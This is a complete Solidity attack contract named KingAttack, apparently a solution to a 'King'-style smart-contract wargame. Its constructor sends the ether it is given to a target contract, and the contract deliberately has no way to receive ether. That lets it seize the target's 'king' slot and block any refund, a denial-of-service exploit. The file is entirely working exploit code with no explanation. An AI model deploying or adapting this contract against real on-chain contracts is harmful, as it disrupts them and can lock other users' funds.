// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

contract KingAttack {
    constructor(address target) payable {
        target.call{value: msg.value}("");
    }
}
